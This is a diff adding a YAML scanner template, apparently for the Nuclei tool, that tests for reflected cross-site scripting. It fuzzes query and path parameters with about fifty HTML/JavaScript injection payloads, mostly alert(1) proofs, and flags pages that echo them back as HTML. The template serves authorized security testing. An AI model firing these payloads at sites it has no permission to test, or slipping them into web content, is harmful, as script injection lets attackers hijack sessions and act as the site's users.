@@ -1,0 +1,97 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<plaintext draggable=\"true\" ondragstart=\"alert(1)\">test</plaintext><script>function dragenter(e){return e.preventDefault();}</script><img src=x ondragend=alert(\"XSS\")>/"
+        - "<tt><script>window.open('http://www.google.com/')</script></tt>"
+        - "&lt;html&gt;&lt;script&gt;alert(&#39;x&#39;)&lt;/script&gt;"
+        - "<canvas id=x tabindex=1 onfocusout=alert(1)></canvas>"
+        - "<details id=x tabindex=1 onfocusout=alert(1)>test</details><input autofocus>"
+        - "<form id=x tabindex=1 onfocusin=alert(1)></form><input autofocus>"
+        - "<sup id=x tabindex=1 ondeactivate=alert(1)></sup><div style=\"position:absolute;left:-1em\" onblur=alert(1)>test</div>"
+        - "<kbd onmouseout=\"alert(1)\">test</kbd>"
+        - "<sup style=\"color:transparent\" onmouseover=\"alert(1)\">test</sup>"
+        - "<p style=\"x:\\xE2\\x80\\x9Ax:x-expression:{alert(1)}\">"
+        - "<address draggable=\"true\" ondragleave=\"alert(1)\">test</address><tt id=x style=\"position:absolute;\" onmouseup=alert(1)></tt>"
+        - "<prompt id=x tabindex=1 onfocusout=alert(1)></prompt>"
+        - "<datalist id=x tabindex=1 onbeforeactivate=alert(1)></datalist><input id=y autocomplete=list-x>"
+        - "<textarea id=\"payload\" ondblclick=alert(1)></textarea>"
+        - "<img src=x onerror=\"javascript:alert(1)\">"
+        - "<font id=\"payload1\" style=\"background-image:url('javascript:alert(1)')\">test</font>"
+        - "<script>alert(1)</script>"
+        - "<video onmouseup=\"alert(1)\">test</video>"
+        - "<form action=\"javascript:alert(1)\" id=x tabindex=1></form><input autofocus>"
+        - "<script src=http://www.example.com/a.js></script>"
+        - "<;script>;alert(1);</;script>"
+        - "<form action=\"javascript:alert(1)\" id=x tabindex=1 onfocusin=alert(1)></form><input autofocus>"
+        - "<menuitem draggable=\"true\" ondragend=\"alert(1)\">test</menuitem>"
+        - "<sup style=\"animation-duration:1s;animation-name:x;x\" onanimationend=\"alert(1)\"></sup>"
+        - "<frame onload=alert(1) tabindex=1 id=x></frame><input autofocus>"
+        - "<basefont color=black ondblclick=alert(1)>test</basefont>"
+        - "<dl draggable=\"true\" ondragenter=\"alert(1)\">test</dl>"
+        - "<code style=\"x:expression(\\xE2\\x83\\xA4javascript:alert(1)\">test</code><code>\\x0DJavaScript:\\x08javascript:alert(1)</code><br style=\\x07\"\\\"javascript:javascript:alert(1)\\\"\">test<br />test<div id=x tabindex=1 onbeforefocusout=\"javascript:alert(1)\" contenteditable>test</div><textarea onkeyup=\"alert(1)\">test</textarea><input value=1 tabindex=1 onbeforeactivate=\"alert(1)\">test</input><button draggable=true ondragenter=alert(1)>test</button><table ondrop=alert(1) id=x></table><video onbeforepaste=alert(1) contenteditable>test</video>"
+        - "<IMG SRC=x onerror=\"javascript:alert(1)\">"
+        - "<textarea oncopy=\"alert(1)\" contenteditable>test</textarea>"
+        - "<style>:target {transform: rotate(180deg);}</style><tr id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)>"
+        - "<fieldset onmousemove=\"alert(1)\">test</fieldset>"
+        - "<html onload=javascript:alert(1)></html>"
+        - "<textarea onmouseout=\"alert(1)\">test</textarea>"
+        - "<svg><script>javascript:alert(1)</script></svg>"
+        - "<sup onmouseup=\"alert(1)\">test</sup>"
+        - "<frameset onerror=\"alert(1)\">test</frameset>"
+        - "<script id=x tabindex=1 onfocusin=\"alert(1)\" contenteditable>test</script>"
+        - "<form oncopy=\"alert(1)\" contenteditable>test</form>"
+        - "<keygen draggable=\"true\" ondragstart=\"alert(1)\">test</keygen>"
+        - "<img src=x:\\x22javascript:alert(1)\";>"
+        - "<script src=\"https://code.jquery.com/jquery-1.10.2.js\"></script>
+<map id=x tabindex=1 ontouchmove=alert(1)></map>"
+        - "<sup draggable=\"true\" ondragend=\"alert(1)\">test</sup>"
+        - "<textarea id=x tabindex=1 onbeforeactivate=alert(1)></textarea><input type=button id=y onclick=window.open(\"\",'_blank').document.activeElement.onfocusin=alert(2)>"
+        - "<font size=50><bgsound src=x:x></font><img src=a:a onload=alert(1)>"
+        - "<frame id=x tabindex=1 ondeactivate=alert(1)></frame><input autofocus>"
+        - "<output onmouseup=\"alert(1)\">test</output>"
+        - "<form onmouseenter=\"alert(1)\">test</form>"
+        - "<iframe srcdoc=\"&#x20;&#x2028;\" style=\"position:absolute;left:-1px\" onbeforecopy=\"alert(1)\"></iframe>"
+        - "<pre ondblclick=\"alert(1)\">test</pre>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
